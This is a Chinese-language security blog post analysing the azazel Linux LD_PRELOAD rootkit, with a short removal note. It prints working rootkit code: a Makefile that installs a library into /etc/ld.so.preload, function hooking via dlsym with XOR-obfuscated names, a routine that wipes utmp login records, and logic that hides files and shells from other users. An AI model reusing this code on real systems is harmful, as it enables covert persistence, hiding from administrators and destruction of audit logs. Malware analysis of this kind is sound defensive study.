# azazel linux下基于预加载的注入——文件隐藏篇

阅读量 **210214**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-04-22 15:30:33

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01093ff73103bd1dbd.jpg)

azazel是一个在liunx平台下进行动态注入的项目

先从makefile文件看

    
    
    INSTALL=/lib
    
    install: all
        @echo [-] Initiating Installation Directory $(INSTALL)
        @test -d $(INSTALL) || mkdir $(INSTALL)
        @echo [-] Installing azazel 
        @install -m 0755 libselinux.so $(INSTALL)/
        @echo [-] Injecting azazel
        @echo $(INSTALL)/libselinux.so > /etc/ld.so.preload
    

这一部分很简单

就是将`/lib/libaselinux.so` 写到 `etc/ld.so.preload` 中 . 利用的机制是库文件加载顺序.

在实验时 ,如果对应.so文件出问题 在每一次使用到链接库时都会出现error 但是不影响使用.报错类似如下

    
    
    ERROR: ld.so: object '/home/kai/Desktop/1.o' from /etc/ld.so.preload cannot be preloaded (only ET_DYN and ET_EXEC can be loaded): ignored
    

无法被预加载 其中只有ET_DYN和ET_EXEC类型文件能被加载

编译简单的库文件

    
    
    gcc 1.c -shared -fPIC -o lb.so
    

将对应路径添加到/etc/ld.so.preload

    
    
    echo $(pwd)/*.so > /etc/ld.so.preload
    

## azazel

azazel造成感染后的后果:

  * gdb无法使用
  * `bits/types/__sigset_t.h`无法找到
  * 每一个运行程序都被注入了对应的.so库
  * 魔改某一对应函数

清除方式 先删除libaselinux.so 再删除ld.so.perload内容

隐藏__开头 OR ld.so.preload 或者/proc/$pid/environ含有HIDE_THIS_SHELL有文件。

主要的文件只在azazel.c中

接下来逐步分析每一个函数的作用

## cleanup

    
    
    void cleanup(void *var, int len)
    

将`var`处 ,长度为`len`的地址清0,并且free该地址 , 与`strdupp`搭配使用

## init

    
    
    void azazel_init(void) {
        DEBUG("[-] azazel.so loaded.\n");
        int i, fd;
    
        if (constr)
            return;
        constr=1;
    
        for (i = 0; i < SYSCALL_SIZE; ++i) {
            char *scall = strdup(syscall_table[i]);
            x(scall);
            strncpy(syscall_list[i].syscall_name, scall, 50);
            syscall_list[i].syscall_func = dlsym(RTLD_NEXT, scall);
            cleanup(scall,strlen(scall));
        }
    }
    

只执行一次

内部调用 `anazel_init`,将`syscall_table`里的伪装数据
复制下来进行处理,结果拷贝到`syscall_list[i].name`中

    
    
    //测试解析函数名称
    #include<string.h>
    #include <stdio.h>
    #include<dlfcn.h>
    void x(char *p) {
        int i, key=0xFE;
        for(i = 0; i < strlen(p); i++)
            p[i] ^= key;
    }
    int main(int argc, char const *argv[])
    {
        int i = 0;
        static char *syscall_table[24] = {
     "\x9f\x9d\x9d\x9b\x8e\x8a", "\x9f\x9d\x9d\x9b\x8d\x8d", "\x9b\x86\x9b\x9d\x88\x9b", "\x92\x97\x90\x95", "\xa1\xa1\x92\x86\x8d\x8a\x9f\x8a", "\xa1\xa1\x92\x86\x8d\x8a\x9f\x8a\xc8\xca", "\x91\x8e\x9b\x90", "\x8c\x93\x9a\x97\x8c", "\x8b\x90\x92\x97\x90\x95", "\x8b\x90\x92\x97\x90\x95\x9f\x8a", "\xa1\xa1\x86\x8d\x8a\x9f\x8a", "\xa1\xa1\x86\x8d\x8a\x9f\x8a\xc8\xca", "\x98\x91\x8e\x9b\x90", "\x98\x91\x8e\x9b\x90\xc8\xca", "\x91\x8e\x9b\x90\x9a\x97\x8c", "\x8c\x9b\x9f\x9a\x9a\x97\x8c", "\x8c\x9b\x9f\x9a\x9a\x97\x8c\xc8\xca", "\x8e\x9f\x93\xa1\x9f\x8b\x8a\x96\x9b\x90\x8a\x97\x9d\x9f\x8a\x9b", "\x8e\x9f\x93\xa1\x91\x8e\x9b\x90\xa1\x8d\x9b\x8d\x8d\x97\x91\x90", "\x8e\x9f\x93\xa1\x9f\x9d\x9d\x8a\xa1\x93\x99\x93\x8a", "\x99\x9b\x8a\x8e\x89\x90\x9f\x93", "\x8e\x9f\x93\xa1\x8d\x93\xa1\x9f\x8b\x8a\x96\x9b\x90\x8a\x97\x9d\x9f\x8a\x9b", "\x99\x9b\x8a\x8e\x89\x90\x9f\x93\xa1\x8c", "\x8e\x9d\x9f\x8e\xa1\x92\x91\x91\x8e"};
         for (i = 0; i < 24; ++i) {
            char *scall = strdup(syscall_table[i]);
            x(scall);
            printf("%s\n",scall );
        }
        return 0;
    }
    

结果试运行如下

![](https://p5.ssl.qhimg.com/t01b2a34c5dd1285b54.png)

并通过`dlsym`获取动态运行库里的函数地址,填充到`syscall_list[i].syscall_func`中

实现`cleanup_wtmp`和`cleanup_utmp` 通过编码解码获取路径`/var/log/wtmp`
如果该路径存在,且内容不为空就将文件填充为0 并重新写入

    
    
    void clean_utmp(char *pts, int verbose) {
        DEBUG("clean_utmp\n");
        struct utmp utmp_ent;
        char *utmp_file = strdup(UTMP_FILE_X);
        int fd;
        x(utmp_file);
        if((fd=(long)syscall_list[SYS_OPEN].syscall_func(utmp_file,O_RDWR))>=0){
            lseek(fd,0,SEEK_SET);
            while(read(fd,&utmp_ent,sizeof(utmp_ent))>0){
                if(!strncmp(utmp_ent.ut_line,pts,strlen(pts))){
                    memset(&utmp_ent,0x00,sizeof(utmp_ent));
                    lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
                    write(fd,&utmp_ent,sizeof(utmp_ent));
                }
            }
            close(fd);
        }
        if (verbose) {
            char *utmp_msg = strdup(UTMP_MSG);
            x(utmp_msg);
            printf("%s\n",utmp_msg);
            cleanup(utmp_msg, strlen(utmp_msg));
        }
        cleanup(utmp_file, strlen(utmp_file));
    }
    

几乎所有被hook的函数中都会出现`is_invisible`函数

## is_invisible

该函数的设计如下

    
    
    int is_invisible(const char *path) {
        DEBUG("is_invisible\n");
        struct stat s_fstat;
        char line[MAX_LEN];
        char p_path[PATH_MAX];
        char *config_file = strdup(CONFIG_FILE);
        FILE *cmd;    
        int fd;
    
        init();
    
        x(config_file);// ld.so.perload
        if(strstr(path, MAGIC_STRING) || strstr(path, config_file)) {
            cleanup(config_file, strlen(config_file));
            return 1;
        }
        char *proc_path = strdup(PROC_PATH);
        x(proc_path);
        if(strstr(path, proc_path)){
            cleanup(proc_path,strlen(proc_path));
            if((long) syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, &s_fstat) != -1){
                char *cmd_line = strdup(CMD_LINE);
                char *env_line = strdup(ENV_LINE);
                x(cmd_line);
                x(env_line);
                snprintf(p_path, PATH_MAX, env_line, path);// /path/environ
                cleanup(cmd_line,strlen(cmd_line));// 
                cleanup(env_line, strlen(env_line));// 
                if((long)(syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, p_path, &s_fstat)) != -1){    
                    cmd = syscall_list[SYS_FOPEN].syscall_func(p_path, "r");
                    if(cmd){
                        char *hide_term_str = strdup(HIDE_TERM_STR);
                        x(hide_term_str);
                        int res;
                        char *step = &line[0];
                        while((res=fgets(line, MAX_LEN, cmd) != NULL)) {
                            if (parse_environ(line, MAX_LEN, hide_term_str) == 1) {
                                cleanup(config_file, strlen(config_file));
                                cleanup(hide_term_str, strlen(hide_term_str));
                                return 1;
                            }
                            memset(line,0x00,MAX_LEN);
                        }
                        fclose(cmd);                
                    }
                }
            }
        } else {
            cleanup(proc_path,strlen(proc_path));
        }
        cleanup(config_file,strlen(config_file));
        return 0;
    }
    

从名字上来看是判断是否文件是否可见 `config_file`是字符串`ld.so.preload` 即用来配置预加载文件的文件名
`MAGIC_STRING`是`__` .文件中含有这两个字符时,判断返回`1` 这也是为什么或会有一些文件无法使用

`proc_path`为`/proc/` 如果路径中含有`/proc/` 进入下一步处理. 通过在`init()`中获取到的函数地址来调用对应的函数

    
    
    (long) syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, &s_fstat)
    

这次使用的是`_xstat` 用来获取对应路径的属性 ,判断是否存在 ,

另外 `cmd_line`解析为`%s/cmdline` `env_line`解析为`%s/environ`

通过snprintf 获得`p_path` 内容为 组合成的`path/environ`

如果该文件存在 , 以只读方式打开文件 .

`hide_term_str`解析为`HIDE_THIS_SHELL`

将/environ文件内容拷贝到`line`中 .

如果它里面有`HIDE_THIS_SHELL`则`is_invisible`函数返回为1

    
    
    int parse_environ(char *stack, int len, char *needle) {
        DEBUG("parse_environ\n");
        char *step = stack;
    
        while(1) {
            if (strstr(step,needle))
                return 1;
            if (*step+1 != '\0') {
                step++;
                if (step-stack >= len) {
                    return 0;
                }
            } else
                return 0;
        }
    }
    

`paese_environ`作用是去除`\x0`再比对

举一个被hook函数的简单例子

    
    
    int rmdir(const char *pathname) {
        DEBUG("rmdir hooked.\n");
        if (is_owner()) 
            return (long)syscall_list[SYS_RMDIR].syscall_func(pathname);
    
        if(is_invisible(pathname)) {
            errno = ENOENT;
            return -1;
        }
    
        return (long)syscall_list[SYS_RMDIR].syscall_func(pathname);
    }
    

根据以上的解析 , 很容易理解它为什么能达到隐藏作用

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **helon** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/237030](/post/id/237030)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [linux](/tag/linux)
  * [预加载](/tag/预加载)

 **+1** __3赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/29IicicKxw4WI7OaKbbDIYAh4skokeqrNozE6kkMmtSqlUSxWdXlzKp6EZI79iaRGiaFLR5uBzq2k05UldCNiarX74g/132)
helon

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

